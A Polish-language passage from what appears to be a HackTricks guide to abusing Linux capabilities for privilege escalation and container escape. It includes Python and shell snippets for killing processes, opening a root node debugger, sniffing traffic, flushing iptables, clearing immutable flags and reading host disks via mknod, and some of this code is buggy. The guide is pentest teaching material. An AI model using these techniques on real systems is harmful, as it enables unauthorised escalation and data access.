Jednak w dokumentacji tego uprawnienia: _CAP\_SETPCAP: \[…] **dodaje dowolne uprawnienie z zestawu ograniczającego wątku wywołującego** do jego zestawu dziedzicznego_.\
Wygląda na to, że możemy dodawać do zestawu dziedzicznego tylko uprawnienia z zestawu ograniczającego. Oznacza to, że **nie możemy umieścić nowych uprawnień, takich jak CAP\_SYS\_ADMIN lub CAP\_SYS\_PTRACE, w zestawie dziedzicznym w celu eskalacji uprawnień**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) zapewnia wiele wrażliwych operacji, w tym dostęp do `/dev/mem`, `/dev/kmem` lub `/proc/kcore`, modyfikację `mmap_min_addr`, dostęp do wywołań systemowych `ioperm(2)` i `iopl(2)`, oraz różne polecenia dyskowe. Poprzez to uprawnienie jest również włączane `FIBMAP ioctl(2)`, co w przeszłości powodowało problemy ([link](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)). Zgodnie z dokumentacją, uprawnienie to pozwala również na **wykonywanie opisowych operacji specyficznych dla urządzeń na innych urządzeniach**.

Może to być przydatne do **eskalacji uprawnień** i **wydostania się z Dockera**.

## CAP\_KILL

**Oznacza to, że można zabić dowolny proces.**

**Przykład z użyciem binariów**

Załóżmy, że binarny plik **`python`** ma to uprawnienie. Jeśli moglibyśmy **również zmodyfikować pewną konfigurację usługi lub gniazda** (lub dowolny plik konfiguracyjny związany z usługą), moglibyśmy tam umieścić pułapkę, a następnie zabić proces związany z tą usługą i poczekać, aż nowy plik konfiguracyjny zostanie wykonany z naszą pułapką.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Przywileje związane z kill**

Jeśli masz uprawnienia do kill i uruchomiony jest program **node jako root** (lub jako inny użytkownik), prawdopodobnie możesz **wysłać** mu sygnał **SIGUSR1**, co spowoduje **otwarcie debugera node**, do którego będziesz mógł się podłączyć.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając na celu promowanie wiedzy technicznej, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Oznacza to, że możliwe jest nasłuchiwanie na dowolnym porcie (nawet na uprzywilejowanych).** Nie można bezpośrednio podnieść uprawnień za pomocą tej zdolności.

**Przykład z użyciem binariów**

Jeśli **`python`** ma tę zdolność, będzie mógł nasłuchiwać na dowolnym porcie i nawet łączyć się z dowolnym innym portem (niektóre usługi wymagają połączeń z określonych portów o uprzywilejowanych uprawnieniach)

{% tabs %}
{% tab title="Nasłuchiwanie" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% tab title="Połącz" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia procesom **tworzenie gniazd RAW i PACKET**, umożliwiając generowanie i wysyłanie dowolnych pakietów sieciowych. Może to prowadzić do ryzyka bezpieczeństwa w środowiskach kontenerowych, takich jak podszywanie się pod pakiety, wstrzykiwanie ruchu i omijanie kontroli dostępu do sieci. Złośliwi aktorzy mogą wykorzystać to do zakłócenia routingu kontenera lub naruszenia bezpieczeństwa sieci hosta, zwłaszcza bez odpowiedniej ochrony zapory sieciowej. Dodatkowo, **CAP_NET_RAW** jest niezbędne dla uprzywilejowanych kontenerów w celu obsługi operacji takich jak ping za pomocą żądań ICMP RAW.

**Oznacza to, że możliwe jest podsłuchiwanie ruchu.** Nie można bezpośrednio eskalować uprawnień za pomocą tej zdolności.

**Przykład z użyciem binariów**

Jeśli binarny plik **`tcpdump`** ma tę zdolność, będzie można go użyć do przechwytywania informacji sieciowych.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Zauważ, że jeśli **środowisko** udostępnia tę zdolność, można również użyć **`tcpdump`** do podsłuchiwania ruchu.

**Przykład z binarnym 2**

Poniższy przykład to kod **`python2`**, który może być przydatny do przechwytywania ruchu interfejsu "**lo**" (**localhost**). Kod pochodzi z laboratorium "_Podstawy: CAP-NET\_BIND + NET\_RAW_" z [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia posiadaczowi zmianę konfiguracji sieciowej, w tym ustawienia zapory sieciowej, tabele routingu, uprawnienia gniazd i ustawienia interfejsu sieciowego w ramach dostępnych przestrzeni nazw sieciowych. Umożliwia również włączanie **trybu promiskuitywnego** na interfejsach sieciowych, co pozwala na podsłuchiwanie pakietów między przestrzeniami nazw.

**Przykład z użyciem pliku binarnego**

Załóżmy, że plik binarny **python** ma te uprawnienia.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Oznacza to, że można modyfikować atrybuty inode.** Nie można bezpośrednio eskalować uprawnień za pomocą tej zdolności.

**Przykład z użyciem pliku binarnego**

Jeśli odkryjesz, że plik jest niezmienny, a python ma tę zdolność, możesz **usunąć atrybut niezmienności i umożliwić modyfikację pliku:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Należy zauważyć, że zazwyczaj atrybut niezmienności jest ustawiany i usuwany za pomocą:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie może umożliwić ucieczkę z środowisk `chroot(2)` za pomocą znanych podatności:

* [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: narzędzie do ucieczki z chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) nie tylko umożliwia wykonanie wywołania systemowego `reboot(2)` dla restartu systemu, w tym konkretnych poleceń takich jak `LINUX_REBOOT_CMD_RESTART2` dostosowanych do określonych platform sprzętowych, ale także umożliwia użycie `kexec_load(2)` i od wersji Linux 3.17 `kexec_file_load(2)` do ładowania nowych lub podpisanych jąder awaryjnych odpowiednio.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) został oddzielony od szerszego **CAP_SYS_ADMIN** w Linuxie 2.6.37, specjalnie umożliwiając użycie wywołania `syslog(2)`. Ta zdolność umożliwia wyświetlanie adresów jądra za pośrednictwem `/proc` i podobnych interfejsów, gdy ustawienie `kptr_restrict` wynosi 1, co kontroluje eksponowanie adresów jądra. Od wersji Linux 2.6.39 domyślnie dla `kptr_restrict` jest wartość 0, co oznacza, że adresy jądra są eksponowane, chociaż wiele dystrybucji ustawia to na 1 (ukrywa adresy z wyjątkiem uid 0) lub 2 (zawsze ukrywa adresy) ze względów bezpieczeństwa.

Dodatkowo, **CAP_SYSLOG** umożliwia dostęp do wyjścia `dmesg`, gdy `dmesg_restrict` jest ustawione na 1. Pomimo tych zmian, **CAP_SYS_ADMIN** nadal zachowuje zdolność do wykonywania operacji `syslog` ze względu na historyczne precedensy.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) rozszerza funkcjonalność wywołania systemowego `mknod` poza tworzenie zwykłych plików, FIFO (nazwane potoki) lub gniazd domen UNIX. W szczególności umożliwia tworzenie plików specjalnych, które obejmują:

- **S_IFCHR**: Pliki specjalne znakowe, które są urządzeniami takimi jak terminale.
- **S_IFBLK**: Pliki specjalne blokowe, które są urządzeniami takimi jak dyski.

Ta zdolność jest niezbędna dla procesów, które wymagają możliwości tworzenia plików urządzeń, ułatwiając bezpośrednią interakcję z sprzętem za pośrednictwem urządzeń znakowych lub blokowych.

Jest to domyślna zdolność dla kontenerów Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ta zdolność umożliwia eskalację uprawnień (poprzez odczyt pełnego dysku) na hoście, w następujących warunkach:

1. Mieć początkowy dostęp do hosta (bez uprawnień).
2. Mieć początkowy dostęp do kontenera (Uprawniony (EUID 0) i efektywna zdolność `CAP_MKNOD`).
3. Host i kontener powinny dzielić tę samą przestrzeń nazw użytkownika.

**Kroki do utworzenia i dostępu do urządzenia blokowego w kontenerze:**

1. **Na hoście jako standardowy użytkownik:**
- Określ swoje bieżące ID użytkownika za pomocą `id`, np. `uid=1000(standardowyuzytkownik)`.
- Zidentyfikuj docelowe urządzenie, na przykład `/dev/sdb`.

2. **Wewnątrz kontenera jako `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Z powrotem na hoście:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
To podejście umożliwia standardowemu użytkownikowi dostęp i potencjalne odczytywanie danych z `/dev/sdb` poprzez kontener, wykorzystując wspólne przestrzenie nazw użytkownika i uprawnienia ustawione na urządzeniu.


### CAP\_SETPCAP

**CAP_SETPCAP** umożliwia procesowi **zmianę zestawów uprawnień** innego procesu, umożliwiając dodawanie lub usuwanie uprawnień z zestawów efektywnych, dziedzicznych i dozwolonych. Jednak proces może modyfikować tylko uprawnienia, które posiada w swoim zestawie dozwolonych, co zapewnia, że nie może podnieść uprawnień innego procesu ponad swoje własne. Ostatnie aktualizacje jądra wprowadziły bardziej restrykcyjne zasady, ograniczając `CAP_SETPCAP` do jedynie zmniejszania uprawnień w swoim własnym lub w zestawach dozwolonych swoich potomków, mając na celu zmniejszenie ryzyka związanego z bezpieczeństwem. Aby korzystać z niego, należy mieć `CAP_SETPCAP` w zestawie efektywnym i docelowe uprawnienia w zestawie dozwolonym, korzystając z `capset()` do modyfikacji. To podsumowuje podstawową funkcję i ograniczenia `CAP_SETPCAP`, podkreślając jego rolę w zarządzaniu uprawnieniami i poprawie bezpieczeństwa.

**`CAP_SETPCAP`** to zdolność systemu Linux, która umożliwia procesowi **modyfikowanie zestawów uprawnień innego procesu**. Pozwala na dodawanie lub usuwanie uprawnień z zestawów efektywnych, dziedzicznych i dozwolonych innych procesów. Jednak istnieją pewne ograniczenia dotyczące korzystania z tej zdolności.

Proces posiadający `CAP_SETPCAP` **może jedynie przyznawać lub usuwać uprawnienia, które znajdują się w jego własnym zestawie dozwolonych uprawnień**. Innymi słowy, proces nie może przyznać uprawnienia innemu procesowi, jeśli sam nie posiada tego uprawnienia. Ograniczenie to uniemożliwia procesowi podniesienie uprawnień innego procesu ponad swój własny poziom uprawnień.

Ponadto, w najnowszych wersjach jądra, zdolność `CAP_SETPCAP` została **dodatkowo ograniczona**. Nie pozwala już procesowi dowolnie modyfikować zestawów uprawnień innych procesów. Zamiast tego, **pozwala jedynie procesowi obniżyć uprawnienia w swoim własnym zestawie dozwolonych uprawnień lub zestawie dozwolonych uprawnień swoich potomków**. Ta zmiana została wprowadzona w celu zmniejszenia potencjalnych ryzyk związanych z uprawnieniami.

Aby efektywnie korzystać z `CAP_SETPCAP`, musisz mieć zdolność w swoim zestawie efektywnym i docelowe uprawnienia w swoim zestawie dozwolonym. Następnie możesz użyć wywołania systemowego `capset()` do modyfikowania zestawów uprawnień innych procesów.

Podsumowując, `CAP_SETPCAP` umożliwia procesowi modyfikowanie zestawów uprawnień innych procesów, ale nie może przyznawać uprawnień, których sam nie posiada. Ponadto, ze względów bezpieczeństwa, jego funkcjonalność została ograniczona w najnowszych wersjach jądra, pozwalając jedynie na zmniejszanie uprawnień w swoim własnym zestawie dozwolonych uprawnień lub zestawach dozwolonych uprawnień swoich potomków.

## Odwołania

**Większość tych przykładów została zaczerpnięta z niektórych laboratoriów** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), więc jeśli chcesz ćwiczyć techniki podwyższania uprawnień, polecam te laboratoria.

**Inne odwołania**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając na celu promowanie wiedzy technicznej, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie**.

</details>
